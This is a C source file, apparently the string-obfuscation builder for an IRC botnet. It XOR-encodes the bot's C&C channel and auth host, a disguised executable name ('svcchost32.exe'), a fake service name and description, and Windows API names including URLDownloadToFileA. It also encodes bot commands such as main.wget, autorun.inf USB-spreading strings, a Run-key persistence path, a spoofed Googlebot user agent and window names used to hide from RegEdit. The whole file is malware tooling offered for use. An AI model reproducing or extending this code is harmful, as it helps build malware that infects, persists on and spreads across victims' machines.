#include <stdio.h>
#include <windows.h>
#include <string.h>
#include <stdlib.h>
#include <tchar.h>

/* CONFIG STRINGS */
char chan[]          = "#chan"; /* channel where commands are output */
char infochan[]      = ""; /* output for usb + torrents go here. */
char chanpass[]      = "";
char authost[]       = "just.authost.com"; /* ex; you@whatever.com - just use "whatever.com" */
char prefix[]        = "."; /* bot prefix */
char exename[]	     = "svcchost32.exe"; /* exename */
char regname[]       = "services32 utility manager"; /* registry & services name */

/**********
STOP EDITING HERE

































DO NOT EDIT BELOW THIS LINE!!
*************/
















































char *Encrypt(unsigned char *string, unsigned char *key)
{
    unsigned int i, j;

    for (i = 0; i < strlen(string); i++)
    {
        for (j = 0; j < strlen(key); j++)
            string[i] ^= key[j];

        string[i] = ~ string[i];
    }

    return string;
}

/* not really encryption, but keeps "stupid" people from knowing your cmds */
char* Reverse_Str(char* str)
{
    char *temp, *ptr;
    int len, i;

    temp=str;
    for (len=0; *temp !='\0';temp++, len++);

    ptr=malloc(sizeof(char)*(len+1));

    for (i=len-1; i>=0; i--)
        ptr[len-i-1]=str[i];

    ptr[len]='\0';
    return ptr;
}

void create_apis(void)
{
    char *kernel32_2, *CreateProcess_2;
    char *shell32_2, *ShellExecute_2, *advapi32_2, *RegCreateKeyEx_2, *RegSetValueEx_2, *RegCloseKey_2, *CheckTokenMembership_2;
    char *WS2_32_2, *WSACleanup_2, *WSAStartup_2, *closesocket_2, *connect_2, *gethostbyname_2, *htons_2, *recv_2, *send_2, *socket_2, *inet_addr_2, *select_2;
    char *urlmon_2, *URLDownloadToFile_2;

    char pass[256];

    printf("\n\n[+] Encryption Setup For: APIS");
    printf("\n    What password/key would you like to use for your other strings?\n");
    gets(pass);

    /* Kernel32.dll */
    char kernel32_[]            = "kernel32.dll";
    char CreateProcess_[]       = "CreateProcessA";

    /* Shell32.dll */
    char shell32_[]             = "shell32.dll";
    char ShellExecute_[]        = "ShellExecuteA";

    /* Advapi32.dll */
    char advapi32_[]            = "Advapi32.dll";
    char RegCreateKeyEx_[]      = "RegCreateKeyA";
    char RegSetValueEx_[]       = "RegSetValueA";
    char RegCloseKey_[]         = "RegCloseKey";
    char CheckTokenMembership_[]= "CheckTokenMembership";

    /* WS2_32.dll */
    char WS2_32[]              = "WS2_32.dll";
    char WSACleanup[]          = "WSACleanup";
    char WSAStartup[]          = "WSAStartup";
    char closesocket[]         = "closesocket";
    char connect[]             = "connect";
    char gethostbyname[]       = "gethostbyname";
    char htons[]               = "htons";
    char recv[]                = "recv";
    char send[]                = "send";
    char socket[]              = "socket";
    char inet_addr[]           = "inet_addr";
    char select[]              = "select";

    /*UrlMon.dll */
    char urlmon[]              = "urlmon.dll";
    char URLDownloadToFile[]   = "URLDownloadToFileA";

    FILE *myFile = fopen("encrypted_strings_api.txt", "w");

    if ( myFile )
    {
        /* ENCRYPTION KEY */
        fprintf(myFile,"/* ENCRYPTION KEY */\n");
        fprintf(myFile,"char api_pass[] = \"%s\";\n\n",pass);

        /* DLLS\APIS */
        kernel32_2     = Encrypt(kernel32_,pass);
        CreateProcess_2= Encrypt(CreateProcess_,pass);

        shell32_2      = Encrypt(shell32_,pass);
        ShellExecute_2 = Encrypt(ShellExecute_,pass);

        advapi32_2     = Encrypt(advapi32_,pass);
        RegCreateKeyEx_2 = Encrypt(RegCreateKeyEx_,pass);
        RegSetValueEx_2 = Encrypt(RegSetValueEx_,pass);
        RegCloseKey_2  = Encrypt(RegCloseKey_,pass);
        CheckTokenMembership_2=Encrypt(CheckTokenMembership_,pass);

        WS2_32_2       = Encrypt(WS2_32,pass);
        WSACleanup_2   = Encrypt(WSACleanup,pass);
        WSAStartup_2   = Encrypt(WSAStartup,pass);
        closesocket_2  = Encrypt(closesocket,pass);
        connect_2      = Encrypt(connect,pass);
        gethostbyname_2= Encrypt(gethostbyname,pass);
        htons_2        = Encrypt(htons,pass);
        recv_2         = Encrypt(recv,pass);
        send_2         = Encrypt(send,pass);
        socket_2       = Encrypt(socket,pass);
        select_2       = Encrypt(select,pass);
        inet_addr_2    = Encrypt(inet_addr,pass);

        urlmon_2       = Encrypt(urlmon,pass);
        URLDownloadToFile_2 = Encrypt(URLDownloadToFile,pass);

        fprintf(myFile,"/* Kernel32.dll */\n");
        fprintf(myFile,"char kernel32_[]             = \"%s\";\n", kernel32_2);
        fprintf(myFile,"char CreateProcess_[]        = \"%s\";\n\n", CreateProcess_2);

        fprintf(myFile,"/* Shell32.dll */\n");
        fprintf(myFile,"char shell32_[]              = \"%s\";\n", shell32_2);
        fprintf(myFile,"char ShellExecute_[]         = \"%s\";\n\n", ShellExecute_2);

        fprintf(myFile,"/* Advapi32.dll */\n");
        fprintf(myFile,"char advapi32_[]             = \"%s\";\n", advapi32_2);
        fprintf(myFile,"char RegCreateKeyEx_[]       = \"%s\";\n", RegCreateKeyEx_2);
        fprintf(myFile,"char RegSetValueEx_[]        = \"%s\";\n", RegSetValueEx_2);
        fprintf(myFile,"char RegCloseKey_[]          = \"%s\";\n", RegCloseKey_2);
        fprintf(myFile,"char CheckTokenMembership_[] = \"%s\";\n\n", CheckTokenMembership_2);

        fprintf(myFile,"/* WS2_32.DLL */\n");
        fprintf(myFile,"char WS2_32_[]              = \"%s\";\n",      WS2_32_2);
        fprintf(myFile,"char WSACleanup_[]          = \"%s\";\n",      WSACleanup_2);
        fprintf(myFile,"char WSAStartup_[]          = \"%s\";\n",      WSAStartup_2);
        fprintf(myFile,"char closesocket_[]         = \"%s\";\n",      closesocket_2);
        fprintf(myFile,"char connect_[]             = \"%s\";\n",      connect_2);
        fprintf(myFile,"char gethostbyname_[]       = \"%s\";\n",      gethostbyname_2);
        fprintf(myFile,"char htons_[]               = \"%s\";\n",      htons_2);
        fprintf(myFile,"char recv_[]                = \"%s\";\n",      recv_2);
        fprintf(myFile,"char send_[]                = \"%s\";\n",      send_2);
        fprintf(myFile,"char socket_[]              = \"%s\";\n",      socket_2);
        fprintf(myFile,"char select_[]              = \"%s\";\n",      select_2);
        fprintf(myFile,"char inet_addr_[]           = \"%s\";\n\n",    inet_addr_2);

        fprintf(myFile,"/*UrlMon.DLL */\n");
        fprintf(myFile,"char urlmon_[]              = \"%s\";\n",       urlmon_2);
        fprintf(myFile,"char URLDownloadToFile_[]   = \"%s\";\n\n",      URLDownloadToFile_2);
        fclose(myFile);
    }
}

void create_config(void)
{
    char pass[256];
    char pass2[256];

    printf("\n                                _                 ");
    printf("\n                               | |                ");
    printf("\n _ __    __ _  _ __ ___    ___ | |  ___  ___  ___ ");
    printf("\n| '_ \\  / _` || '_ ` _ \\  / _ \\| | / _ \\/ __|/ __|");
    printf("\n| | | || (_| || | | | | ||  __/| ||  __/\__ \\__ \\");
    printf("\n|_| |_| \\__,_||_| |_| |_| \\___||_| \\__||___/|__/");

    printf("\n\n[+] Encryption Setup For: CONFIG");
    printf("\n\n    What password/key would you like to use for your config?\n");
    gets(pass2);

    FILE *myFile = fopen("encrypted_strings_config.txt", "w");

    if ( myFile )
    {
        /* ENCRYPTION KEY */
        fprintf(myFile,"/* ENCRYPTION KEY */\n");
        fprintf(myFile,"char config_pass[] = \"%s\";\n\n", pass2);

        char *chan_2, *infochan_2, *chanpass_2, *authost_2, *prefix_2;
        char *exename_2, *regname_2;

        /* COMMANDS */
        chan_2      = Encrypt(chan, pass2);
        infochan_2  = Encrypt(infochan, pass2);
        chanpass_2  = Encrypt(chanpass, pass2);
        authost_2   = Encrypt(authost, pass2);
        prefix_2    = Encrypt(prefix, pass2);
        exename_2   = Encrypt(exename, pass2);
        regname_2   = Encrypt(regname, pass2);

        fprintf(myFile,"/* GENERAL CONFIG */\n");
        fprintf(myFile,"char chan[]          = \"%s\";\n",  chan_2);
        fprintf(myFile,"char chanpass[]      = \"%s\";\n",  chanpass_2);
        fprintf(myFile,"char infochan[]      = \"%s\";\n",  infochan_2);
        fprintf(myFile,"char authost[]       = \"%s\";\n",  authost_2);
        fprintf(myFile,"char prefix[]        = \"%s\";\n",  prefix_2);
        fprintf(myFile,"char exename[]       = \"%s\";\n",  exename_2);
        fprintf(myFile,"char regname[]       = \"%s\";\n",  regname_2);

        fclose(myFile);
    }
}

void create_other(void)
{
    char pass[256];

    printf("\n\n[+] Encryption Setup For: OTHER");
    printf("\n    What password/key would you like to use for your other strings?\n");
    gets(pass);

    /* COMMANDS */
    char cmd__RECONNECT[]          = "main.recon";  /* main.recon */
    char cmd__REMOVAL[]            = "main.removal"; /* main.removal */
    char cmd__JOIN[]               = "main.join"; /* main.join */
    char cmd__PART[]               = "main.part"; /* main. part */
    char cmd__WGET[]               = "main.wget"; /* main.wget */

    /* IRC */
    char str_nick[]                = "NICK";
    char str_user[]                = "USER";
    char str_privmsg[]             = "PRIVMSG";
    char str_notice[]              = "NOTICE";
    char str_pass[]                = "PASS";
    char str_join[]                = "JOIN";
    char str_part[]                = "PART";
    char str_quit[]                = "QUIT";
    char str_ping[]                = "PING";
    char str_pong[]                = "PONG";
    char str_my_443[]              = "443";
    char str_my_332[]              = "332";

    /* OTHERS */
    char userprofile[]          = "USERPROFILE";
    char autorun[]              = "\\autorun.inf";
    char autorun2[]             = "[autorun]\r\nopen=";
    char regkey_location[]      = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    char servicedesc[]          = "Creates diagnostics for services and applictions running in non-standard environments.";
    char useragent[]            = "Googlebot\2.1";
    char str_reconnect[]        = "Reconnecting to Node.";
    char str_removing[]         = "Removing from Node.";

    /* For Nick */
    char win_unk[]              = "WIN";
    char win_2k[]               = "WIN2K";
    char win_xp[]               = "WINXP";
    char win_2k3[]              = "WIN2K3";
    char win_vista[]            = "VISTA";
    char win_2k8[]              = "WIN2K8";
    char win_7[]                = "WIN7";

    /* For Hider */
    char win_number[]           = "#32770";
    char regedit[]              = "RegEdit_RegEdit";
    char syslist32[]            = "SysListView32";
    char t1m3r[]                = "myTimer";

    char *str_nick2,*str_user2,*str_privmsg2,*str_notice2,*str_pass2,*str_join2,*str_part2,*str_quit2,*str_ping2,*str_pong2,*str_my_443_2,*str_my_332_2;
    char *cmd__JOIN_2, *cmd__PART_2, *cmd__RECONNECT_2, *cmd__REMOVAL_2, *cmd__WGET_2;
    char *userprofile_2, *autorun_2, *autorun2_2, *regkey_location_2, *servicedesc_2, *useragent_2, *str_reconnect_2, *str_removing_2;
    char *win_unk_2, *win_2k_2, *win_xp_2, *win_2k3_2, *win_2k8_2, *win_vista_2, *win_7_2;
    char *win_number_2, *regedit_2, *syslist32_2, *t1m3r_2;

    FILE *myFile = fopen("encrypted_strings_other.txt", "w");

    if ( myFile )
    {
        /* ENCRYPTION KEY */
        fprintf(myFile,"/* ENCRYPTION KEY */\n");
        fprintf(myFile,"char other_pass[] = \"%s\";\n\n",pass);

        /* COMMANDS */
        /* cmd__RECONNECT_2 = Encrypt(cmd__RECONNECT,pass);*/
        cmd__RECONNECT_2 = Encrypt(cmd__RECONNECT,pass);
        cmd__REMOVAL_2 = Encrypt(cmd__REMOVAL,pass);
        cmd__JOIN_2 = Encrypt(cmd__JOIN,pass);
        cmd__PART_2 = Encrypt(cmd__PART,pass);
        cmd__WGET_2 = Encrypt(cmd__WGET,pass);

        /* IRC */
        str_nick2      = Encrypt(str_nick,pass);
        str_user2      = Encrypt(str_user,pass);
        str_privmsg2   = Encrypt(str_privmsg,pass);
        str_notice2    = Encrypt(str_notice,pass);
        str_pass2      = Encrypt(str_pass,pass);
        str_join2      = Encrypt(str_join,pass);
        str_part2      = Encrypt(str_part,pass);
        str_quit2      = Encrypt(str_quit,pass);
        str_my_443_2   = Encrypt(str_my_443,pass);
        str_my_332_2   = Encrypt(str_my_332,pass);
        str_ping2      = str_ping;
        str_pong2      = str_pong;

        regkey_location_2 = Encrypt(regkey_location,pass);
        autorun_2 = Encrypt(autorun,pass);
        autorun2_2 = Encrypt(autorun2,pass);
        userprofile_2 = Encrypt(userprofile,pass);
        servicedesc_2 = Encrypt(servicedesc,pass);
        useragent_2 = Encrypt(useragent,pass);
        str_reconnect_2=Encrypt(str_reconnect,pass);
        str_removing_2 =Encrypt(str_removing,pass);

        win_unk_2 = Encrypt(win_unk,pass);
        win_2k_2 = Encrypt(win_2k,pass);
        win_xp_2 = Encrypt(win_xp,pass);
        win_2k3_2 = Encrypt(win_2k3,pass);
        win_vista_2 = Encrypt(win_vista,pass);
        win_2k8_2 = Encrypt(win_2k8,pass);
        win_7_2 = Encrypt(win_7,pass);

        win_number_2 = Encrypt(win_number,pass);
        regedit_2 = Encrypt(regedit,pass);
        syslist32_2 = Encrypt(syslist32,pass);
        t1m3r_2 = Encrypt(t1m3r,pass);

        fprintf(myFile,"/* COMMANDS */\n");
        fprintf(myFile,"char cmd__RECONNECT[]       = \"%s\"; /* main.recon */\n",        cmd__RECONNECT_2);
        fprintf(myFile,"char cmd__REMOVAL[]         = \"%s\"; /* main.removal */\n",      cmd__REMOVAL_2);
        fprintf(myFile,"char cmd__JOIN[]            = \"%s\"; /* main.join */\n",         cmd__JOIN_2);
        fprintf(myFile,"char cmd__PART[]            = \"%s\"; /* main.part */\n",         cmd__PART_2);
        fprintf(myFile,"char cmd__WGET[]            = \"%s\"; /* main.wget */\n\n",       cmd__WGET_2);

        fprintf(myFile,"/* IRC */\n");
        fprintf(myFile,"char my_nick[]              = \"%s\";\n",      str_nick2);
        fprintf(myFile,"char my_user[]              = \"%s\";\n",    str_user2);
        fprintf(myFile,"char my_privmsg[]           = \"%s\";\n", str_privmsg2);
        fprintf(myFile,"char my_notice[]            = \"%s\";\n",  str_notice2);
        fprintf(myFile,"char my_pass[]              = \"%s\";\n",    str_pass2);
        fprintf(myFile,"char my_join[]              = \"%s\";\n",    str_join2);
        fprintf(myFile,"char my_part[]              = \"%s\";\n",    str_part2);
        fprintf(myFile,"char my_quit[]              = \"%s\";\n",    str_quit2);
        fprintf(myFile,"char my_P1N6[]              = \"%s\";\n",    str_ping2);
        fprintf(myFile,"char my_P0N6[]              = \"%s\";\n",    str_pong2);
        fprintf(myFile,"char my_4_4_3[]             = \"%s\";\n",     str_my_443_2);
        fprintf(myFile,"char my_3_3_2[]             = \"%s\";\n\n",     str_my_332_2);

        fprintf(myFile,"/* Other Strings */\n");
        fprintf(myFile,"char my_userprofile[]       = \"%s\";\n",       userprofile_2);
        fprintf(myFile,"char autorun[]              = \"%s\";\n",        autorun_2);
        fprintf(myFile,"char autorun2[]             = \"%s\";\n",       autorun2_2);
        fprintf(myFile,"char regkey_location[]      = \"%s\";\n",        regkey_location_2);
        fprintf(myFile,"char servicedesc[]          = \"%s\";\n",       servicedesc_2);
        fprintf(myFile,"char useragent[]            = \"%s\";\n",       useragent_2);
        fprintf(myFile,"char str_reconnect[]        = \"%s\";\n",       str_reconnect_2);
        fprintf(myFile,"char str_removing[]         = \"%s\";\n\n",       str_removing_2);

        fprintf(myFile,"/* For Nick */\n");
        fprintf(myFile,"char win_unk[]              = \"%s\";\n",   win_unk_2);
        fprintf(myFile,"char win_2k[]               = \"%s\";\n",   win_2k_2);
        fprintf(myFile,"char win_xp[]               = \"%s\";\n",   win_xp_2);
        fprintf(myFile,"char win_2k3[]              = \"%s\";\n",   win_2k3_2);
        fprintf(myFile,"char win_vista[]            = \"%s\";\n",   win_vista_2);
        fprintf(myFile,"char win_2k8[]              = \"%s\";\n",   win_2k8_2);
        fprintf(myFile,"char win_7[]                = \"%s\";\n\n",   win_7_2);

        fprintf(myFile,"/* For Hider */\n");
        fprintf(myFile,"char win_number[]           = \"%s\";\n",   win_number_2);
        fprintf(myFile,"char regedit[]              = \"%s\";\n",   regedit_2);
        fprintf(myFile,"char syslist32[]            = \"%s\";\n",   syslist32_2);
        fprintf(myFile,"char t1m3r[]                = \"%s\";\n",   t1m3r_2);

        fclose(myFile);
    }
}

int main()
{
    create_config();
    create_apis();
    create_other();
    return 0;
}
